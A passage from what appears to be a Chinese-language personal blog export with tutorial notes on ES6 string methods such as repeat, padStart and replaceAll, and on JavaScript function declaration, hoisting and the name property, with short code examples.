<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\u004F\u030C&#x27;</span>.normalize(<span class="string">&#x27;NFC&#x27;</span>).length <span class="comment">// 1</span></span><br><span class="line"><span class="string">&#x27;\u004F\u030C&#x27;</span>.normalize(<span class="string">&#x27;NFD&#x27;</span>).length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，<code>NFC</code>参数返回字符的合成形式，<code>NFD</code>参数返回字符的分解形式。</p>
<p>不过，<code>normalize</code>方法目前不能识别三个或三个以上字符的合成。这种情况下，还是只能使用正则表达式，通过 Unicode 编号区间判断。</p>
<h4 id="5-5-实例方法：includes-startsWith-endsWith"><a href="#5-5-实例方法：includes-startsWith-endsWith" class="headerlink" title="5.5 实例方法：includes(), startsWith(), endsWith()"></a>5.5 实例方法：includes(), startsWith(), endsWith()</h4><p>传统上，JavaScript 只有<code>indexOf</code>方法，可以用来确定一个字符串是否包含在另一个字符串中。ES6 又提供了三种新方法。</p>
<ul>
<li><code>includes()</code>：返回布尔值，表示是否找到了参数字符串。</li>
<li><code>startsWith()</code>：返回布尔值，表示参数字符串是否在原字符串的头部。</li>
<li><code>endsWith()</code>：返回布尔值，表示参数字符串是否在原字符串的尾部。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.startsWith(<span class="string">&#x27;Hello&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">&#x27;!&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">&#x27;o&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>这三个方法都支持第二个参数，表示开始搜索的位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.startsWith(<span class="string">&#x27;world&#x27;</span>, <span class="number">6</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">6</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，使用第二个参数<code>n</code>时，<code>endsWith</code>的行为与其他两个方法有所不同。它针对前<code>n</code>个字符，而其他两个方法针对从第<code>n</code>个位置直到字符串结束。</p>
<h4 id="5-6-实例方法：repeat"><a href="#5-6-实例方法：repeat" class="headerlink" title="5.6 实例方法：repeat()"></a>5.6 实例方法：repeat()</h4><p><code>repeat</code>方法返回一个新字符串，表示将原字符串重复<code>n</code>次。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.repeat(<span class="number">3</span>) <span class="comment">// &quot;xxx&quot;</span></span><br><span class="line"><span class="string">&#x27;hello&#x27;</span>.repeat(<span class="number">2</span>) <span class="comment">// &quot;hellohello&quot;</span></span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="number">0</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>参数如果是小数，会被取整。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="number">2.9</span>) <span class="comment">// &quot;nana&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>repeat</code>的参数是负数或者<code>Infinity</code>，会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="literal">Infinity</span>)</span><br><span class="line"><span class="comment">// RangeError</span></span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(-<span class="number">1</span>)</span><br><span class="line"><span class="comment">// RangeError</span></span><br></pre></td></tr></table></figure>
<p>但是，如果参数是 <code>0</code> 到<code>-1</code> 之间的小数，则等同于 <code>0</code>，这是因为会先进行取整运算。<code>0</code> 到<code>-1</code> 之间的小数，取整以后等于<code>-0</code>，<code>repeat</code>视同为 <code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(-<span class="number">0.9</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>参数<code>NaN</code>等同于 0。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="literal">NaN</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>repeat</code>的参数是字符串，则会先转换成数字。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="string">&#x27;na&#x27;</span>) <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="string">&#x27;3&#x27;</span>) <span class="comment">// &quot;nanana&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="5-7-实例方法：padStart-，padEnd"><a href="#5-7-实例方法：padStart-，padEnd" class="headerlink" title="5.7 实例方法：padStart()，padEnd()"></a>5.7 实例方法：padStart()，padEnd()</h4><p>ES2017 引入了字符串补全长度的功能。如果某个字符串不够指定长度，会在头部或尾部补全。<code>padStart()</code>用于头部补全，<code>padEnd()</code>用于尾部补全。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">5</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;ababx&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">4</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;abax&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">5</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xabab&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">4</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xaba&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>padStart()</code>和<code>padEnd()</code>一共接受两个参数，第一个参数是字符串补全生效的最大长度，第二个参数是用来补全的字符串。</p>
<p>如果原字符串的长度，等于或大于最大长度，则字符串补全不生效，返回原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;xxx&#x27;</span>.padStart(<span class="number">2</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xxx&#x27;</span></span><br><span class="line"><span class="string">&#x27;xxx&#x27;</span>.padEnd(<span class="number">2</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure>
<p>如果用来补全的字符串与原字符串，两者的长度之和超过了最大长度，则会截去超出位数的补全字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;0123456789&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;0123456abc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>如果省略第二个参数，默认使用空格补全长度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">4</span>) <span class="comment">// &#x27;   x&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">4</span>) <span class="comment">// &#x27;x   &#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>padStart()</code>的常见用途是为数值补全指定位数。下面代码生成 10 位的数值字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment">// &quot;0000000001&quot;</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment">// &quot;0000000012&quot;</span></span><br><span class="line"><span class="string">&#x27;123456&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment">// &quot;0000123456&quot;</span></span><br></pre></td></tr></table></figure>
<p>另一个用途是提示字符串格式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) <span class="comment">// &quot;YYYY-MM-12&quot;</span></span><br><span class="line"><span class="string">&#x27;09-12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) <span class="comment">// &quot;YYYY-09-12&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="5-8-实例方法：trimStart-，trimEnd"><a href="#5-8-实例方法：trimStart-，trimEnd" class="headerlink" title="5.8 实例方法：trimStart()，trimEnd()"></a>5.8 实例方法：trimStart()，trimEnd()</h4><p>ES2019 对字符串实例新增了<code>trimStart()</code>和<code>trimEnd()</code>这两个方法。它们的行为与<code>trim()</code>一致，<code>trimStart()</code>消除字符串头部的空格，<code>trimEnd()</code>消除尾部的空格。它们返回的都是新字符串，不会修改原始字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="string">&#x27;  abc  &#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.trim() <span class="comment">// &quot;abc&quot;</span></span><br><span class="line">s.trimStart() <span class="comment">// &quot;abc  &quot;</span></span><br><span class="line">s.trimEnd() <span class="comment">// &quot;  abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>trimStart()</code>只消除头部的空格，保留尾部的空格。<code>trimEnd()</code>也是类似行为。</p>
<p>除了空格键，这两个方法对字符串头部（或尾部）的 tab 键、换行符等不可见的空白符号也有效。</p>
<p>浏览器还部署了额外的两个方法，<code>trimLeft()</code>是<code>trimStart()</code>的别名，<code>trimRight()</code>是<code>trimEnd()</code>的别名。</p>
<h4 id="5-9-实例方法：matchAll"><a href="#5-9-实例方法：matchAll" class="headerlink" title="5.9 实例方法：matchAll()"></a>5.9 实例方法：matchAll()</h4><p><code>matchAll()</code>方法返回一个正则表达式在当前字符串的所有匹配，详见《正则的扩展》的一章。</p>
<h4 id="5-10-实例方法：replaceAll"><a href="#5-10-实例方法：replaceAll" class="headerlink" title="5.10 实例方法：replaceAll()"></a>5.10 实例方法：replaceAll()</h4><p>历史上，字符串的实例方法<code>replace()</code>只能替换第一个匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replace(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;aa_bcc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，<code>replace()</code>只将第一个<code>b</code>替换成了下划线。</p>
<p>如果要替换所有的匹配，不得不使用正则表达式的<code>g</code>修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replace(<span class="regexp">/b/g</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;aa__cc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>正则表达式毕竟不是那么方便和直观，ES2021 引入了<code>replaceAll()</code>方法，可以一次性替换所有匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;aa__cc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>它的用法与<code>replace()</code>相同，返回一个新字符串，不会改变原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.replaceAll(searchValue, replacement)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>searchValue</code>是搜索模式，可以是一个字符串，也可以是一个全局的正则表达式（带有<code>g</code>修饰符）。</p>
<p>如果<code>searchValue</code>是一个不带有<code>g</code>修饰符的正则表达式，<code>replaceAll()</code>会报错。这一点跟<code>replace()</code>不同。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不报错</span></span><br><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replace(<span class="regexp">/b/</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replaceAll(<span class="regexp">/b/</span>, <span class="string">&#x27;_&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面例子中，/b/不带有g修饰符，会导致replaceAll()报错。</p>
<p>replaceAll()的第二个参数replacement是一个字符串，表示替换的文本，其中可以使用一些特殊字符串。</p>
<ul>
<li><code>$&amp;</code>：匹配的子字符串。</li>
<li><code>$` </code>：匹配结果前面的文本。</li>
<li><code>$&#39;</code>：匹配结果后面的文本。</li>
<li><code>$n</code>：匹配成功的第n组内容，n是从1开始的自然数。这个参数生效的前提是，第一个参数必须是正则表达式。</li>
<li><code>$$</code>：指代美元符号$。</li>
</ul>
<p>下面是一些例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $&amp; 表示匹配的字符串，即`b`本身</span></span><br><span class="line"><span class="comment">// 所以返回结果与原字符串一致</span></span><br><span class="line"><span class="string">&#x27;abbc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;$&amp;&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;abbc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $` 表示匹配结果之前的字符串</span></span><br><span class="line"><span class="comment">// 对于第一个`b`，$` 指代`a`</span></span><br><span class="line"><span class="comment">// 对于第二个`b`，$` 指代`ab`</span></span><br><span class="line"><span class="string">&#x27;abbc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;$`&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;aaabc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $&#x27; 表示匹配结果之后的字符串</span></span><br><span class="line"><span class="comment">// 对于第一个`b`，$&#x27; 指代`bc`</span></span><br><span class="line"><span class="comment">// 对于第二个`b`，$&#x27; 指代`c`</span></span><br><span class="line"><span class="string">&#x27;abbc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">`$&#x27;`</span>)</span><br><span class="line"><span class="comment">// &#x27;abccc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $1 表示正则表达式的第一个组匹配，指代`ab`</span></span><br><span class="line"><span class="comment">// $2 表示正则表达式的第二个组匹配，指代`bc`</span></span><br><span class="line"><span class="string">&#x27;abbc&#x27;</span>.replaceAll(<span class="regexp">/(ab)(bc)/g</span>, <span class="string">&#x27;$2$1&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;bcab&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $$ 指代 $</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;$$&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;a$c&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>replaceAll()</code>的第二个参数<code>replacement</code>除了为字符串，也可以是一个函数，该函数的返回值将替换掉第一个参数<code>searchValue</code>匹配的文本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="function">() =&gt;</span> <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;aa__cc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，<code>replaceAll()</code>的第二个参数是一个函数，该函数的返回值会替换掉所有<code>b</code>的匹配。</p>
<p>这个替换函数可以接受多个参数。第一个参数是捕捉到的匹配内容，第二个参数捕捉到是组匹配（有多少个组匹配，就有多少个对应的参数）。此外，最后还可以添加两个参数，倒数第二个参数是捕捉到的内容在整个字符串中的位置，最后一个参数是原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;123abc456&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/(\d+)([a-z]+)(\d+)/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">match, p1, p2, p3, offset, string</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [p1, p2, p3].join(<span class="string">&#x27; - &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">str.replaceAll(regex, replacer)</span><br><span class="line"><span class="comment">// 123 - abc - 456</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，正则表达式有三个组匹配，所以<code>replacer()</code>函数的第一个参数<code>match</code>是捕捉到的匹配内容（即字符串<code>123abc456</code>），后面三个参数<code>p1</code>、<code>p2</code>、<code>p3</code>则依次为三个组匹配。</p>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 字符串的新增方法</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0004</title>
    <url>/2021/05/06/%E6%89%93%E5%8D%A10004/</url>
    <content><![CDATA[<p><font color=#45b97c>愿每个人都能收获相处舒服的关系，既能保持分寸，又不会疏离；既能守住底线，又不至于单薄；可以各自忙碌，又彼此牵挂、惦记，简单又纯粹。</font></p>
<h2 id="JS数据类型"><a href="#JS数据类型" class="headerlink" title="JS数据类型"></a>JS数据类型</h2><h3 id="5-函数"><a href="#5-函数" class="headerlink" title="5.函数"></a>5.函数</h3><h4 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h4><h5 id="5-1-1-函数的声明"><a href="#5-1-1-函数的声明" class="headerlink" title="5.1.1 函数的声明"></a>5.1.1 函数的声明</h5><p>JavaScript 有三种声明函数的方法</p>
<span id="more"></span>
<ol>
<li><p>function命令<br><code>function</code>命令声明的代码区块，就是一个函数。<code>function</code>命令后面是函数名，函数名后面是一对圆括号，里面是传入函数的参数。函数体放在大括号里面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>函数表达式<br>除了用<code>function</code>命令声明函数，还可以采用变量赋值的写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> print = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这种写法将一个匿名函数赋值给变量。这时，这个匿名函数又称函数表达式（Function Expression），因为赋值语句的等号右侧只能放表达式<br>采用函数表达式声明函数时，<code>function</code>命令后面不带有函数名。如果加上函数名，该函数名只在函数体内部有效，在函数体外部无效</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> print = <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">typeof</span> x);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"><span class="comment">// ReferenceError: x is not defined</span></span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line"><span class="comment">// function</span></span><br></pre></td></tr></table></figure>
<p>上面代码在函数表达式中，加入了函数名x。这个x只在函数体内部可用，指代函数表达式本身，其他地方都不可用。这种写法的用处有两个，一是可以在函数体内部调用自身，二是方便除错（除错工具显示函数调用栈时，将显示函数名，而不再显示这里是一个匿名函数）。因此，下面的形式声明函数也非常常见</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，函数的表达式需要在语句的结尾加上分号，表示语句结束。而函数的声明在结尾的大括号后面不用加分号。总的来说，这两种声明函数的方式，差别很细微，可以近似认为是等价的</p>
</li>
<li><p>Function 构造函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="keyword">new</span> <span class="built_in">Function</span>(</span><br><span class="line">  <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;return x + y&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，Function构造函数接受三个参数，除了最后一个参数是add函数的“函数体”，其他参数都是add函数的参数,Function构造函数可以不使用new命令，返回结果完全一样。</p>
</li>
</ol>
<p>总的来说，这种声明函数的方式非常不直观，几乎无人使用</p>
<h5 id="5-1-2-函数的重复声明"><a href="#5-1-2-函数的重复声明" class="headerlink" title="5.1.2 函数的重复声明"></a>5.1.2 函数的重复声明</h5><p>如果同一个函数被多次声明，后面的声明就会覆盖前面的声明</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，后一次的函数声明覆盖了前面一次。而且，由于函数名的提升，第一次声明在任何时候都是无效的</p>
<h5 id="5-1-3-圆括号运算符，return语句和递归"><a href="#5-1-3-圆括号运算符，return语句和递归" class="headerlink" title="5.1.3 圆括号运算符，return语句和递归"></a>5.1.3 圆括号运算符，return语句和递归</h5><p>调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>函数体内部的<code>return</code>语句，表示返回。JavaScript 引擎遇到<code>return</code>语句，就直接返回<code>return</code>后面的那个表达式的值，后面即使还有语句，也不会得到执行<br>也就是说，<code>return</code>语句所带的那个表达式，就是函数的返回值。<code>return</code>语句不是必需的，如果没有的话，该函数就不返回任何值，或者说返回<code>undefined</code></p>
<p>函数可以调用自身，这就是递归（recursion）。下面就是通过递归，计算斐波那契数列的代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (num === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (num === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> fib(num - <span class="number">2</span>) + fib(num - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fib(<span class="number">6</span>) <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<h5 id="5-1-4-第一等公民"><a href="#5-1-4-第一等公民" class="headerlink" title="5.1.4 第一等公民"></a>5.1.4 第一等公民</h5><p>JavaScript 语言将函数看作一种值，与其它值（数值、字符串、布尔值等等）地位相同。凡是可以使用值的地方，就能使用函数<br>比如，可以把函数赋值给变量和对象的属性，也可以当作参数传入其他函数，或者作为函数的结果返回。函数只是一个可以执行的值，此外并无特殊之处<br>由于函数与其他数据类型地位平等，所以在 JavaScript 语言中又称函数为第一等公民</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将函数赋值给一个变量</span></span><br><span class="line"><span class="keyword">var</span> operator = add;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将函数作为参数和返回值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">op</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> op;</span><br><span class="line">&#125;</span><br><span class="line">a(add)(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<h5 id="5-1-5函数名的提升"><a href="#5-1-5函数名的提升" class="headerlink" title="5.1.5函数名的提升"></a>5.1.5函数名的提升</h5><p>avaScript 引擎将函数名视同变量名，所以采用function命令声明函数时，整个函数会像变量声明一样，被提升到代码头部。所以，下面的代码不会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>表面上，上面代码好像在声明之前就调用了函数f。但是实际上，由于“变量提升”，函数f被提升到了代码头部，也就是在调用之前已经声明了<br>但是，如果采用赋值语句定义函数，JavaScript 就会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f();</span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="comment">// TypeError: undefined is not a function</span></span><br><span class="line">等同于</span><br><span class="line"><span class="keyword">var</span> f;</span><br><span class="line">f();</span><br><span class="line">f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码第二行，调用f的时候，f只是被声明了，还没有被赋值，等于<code>undefined</code>，所以会报错</p>
<p>如果像下面例子这样，采用function命令和var赋值语句声明同一个函数，由于存在函数提升，最后会采用var赋值语句的定义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，表面上后面声明的函数f，应该覆盖前面的var赋值语句，但是由于存在函数提升，实际上正好反过来</p>
<h4 id="5-2函数的属性和方法"><a href="#5-2函数的属性和方法" class="headerlink" title="5.2函数的属性和方法"></a>5.2函数的属性和方法</h4><h5 id="5-2-1-name属性"><a href="#5-2-1-name属性" class="headerlink" title="5.2.1 name属性"></a>5.2.1 name属性</h5><p>函数的name属性返回函数的名字</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">f1.name <span class="comment">// &quot;f1&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果是通过变量赋值定义的函数，那么name属性返回变量名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">f2.name <span class="comment">// &quot;f2&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果变量的值是一个具名函数，那么<code>name</code>属性返回<code>function</code>关键字之后的那个函数名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f3 = <span class="function"><span class="keyword">function</span> <span class="title">myName</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">f3.name <span class="comment">// &#x27;myName&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>f3.name</code>返回函数表达式的名字。注意，真正的函数名还是f3，而<code>myName</code>这个名字只在函数体内部可用</p>
